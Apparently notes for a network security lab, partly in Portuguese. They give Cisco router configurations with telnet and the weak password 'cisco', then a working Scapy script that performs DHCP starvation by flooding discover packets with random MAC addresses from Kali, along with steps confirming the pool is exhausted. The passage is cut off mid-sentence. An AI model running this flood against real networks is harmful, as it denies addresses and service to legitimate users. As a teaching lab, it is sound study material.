R1:
conf t
int g0/0
ip add 192.168.1.1 255.255.255.0
no sh
ip dhcp excluded-address 192.168.1.1 192.168.1.9 
ip dhcp excluded-address 192.168.1.254 
ip dhcp pool LAN-POOL-1 
network 192.168.1.0 255.255.255.0 
default-router 192.168.1.1 
domain-name span.com
exit
do wr
exit
conf t
int g0/1
ip add 192.168.2.2 255.255.255.0
no sh
exit
exit
wr

R2:
en
conf t
int g0/0
ip add 192.168.2.1 255.255.255.0
no sh
exit
line vty 0 4
login
password cisco
login
exit
enable password cisco
line vty 0 4
transport input telnet
exit
exit
conf t
ip route 192.168.1.0 255.255.255.0 192.168.2.2
ip route 192.168.1.0 255.255.255.0 192.168.2.3
exit
wr


Kali:
ETH0: 192.168.2.3 | 255.255.255.0 | 192.168.2.1
ETH1: 192.168.1.2 | 255.255.255.0 | 192.168.1.1

NetUtils1 & 2:
Configurar para obter endereço IP através do Servidor DHCP do router

Passos:
-> Desligar o netutils 2 
-> No kali lançar o script DHCPbasic.py

Scipt:
#!/usr/bin/env python3
#DHCP Starvation:
#Import Scapy
from scapy.all import *
#conf.checkIPaddr needs to be set to False. 
#When conf.checkIpaddr the reponse IP isn't checked
#against sending IP address. Don't need to match.	
conf.checkIPaddr = False

#Create DHCP discover with destination IP = broadadcast
#Source MAC address is a random MAC address
#Source IP address = 0.0.0.0
#Destination IP address = broadcast
#Source port = 68 (DHCP / BOOTP Client)
#Destination port = 67 (DHCP / BOOTP Server)
#DHCP message type is discover
dhcp_discover = Ether(dst='ff:ff:ff:ff:ff:ff',src=RandMAC())  \
                     /IP(src='0.0.0.0',dst='255.255.255.255') \
                     /UDP(sport=68,dport=67) \
                     /BOOTP(op=1,chaddr = RandMAC()) \
                     /DHCP(options=[('message-type','discover'),('end')])

#Send packet out of eth0 and loop the packet
sendp(dhcp_discover,iface='eth1',loop=1,verbose=1)

#Credits:
#https://scapy.readthedocs.io/_/downloads/en/latest/pdf/
#https://www.programcreek.com/

-> Após realizar o ataque vai verificar que a pool de dhcp de ip's do router vai ficar cheia "show ip dhcp bindings"
-> A seguir se tentar ligar o netutils 2 ele não vai receber um ip do router pois o router já não tem mais para dar
-> O script: 
  -> Cria pacotes de DHCP discover com mac's diferentes
  -> O router pensa que é outro computador a pedir o IP e atribui-lhe um novo
  -> Depois de atribuído o pc tenta fazer telnet para o router e em vez de a ligaç
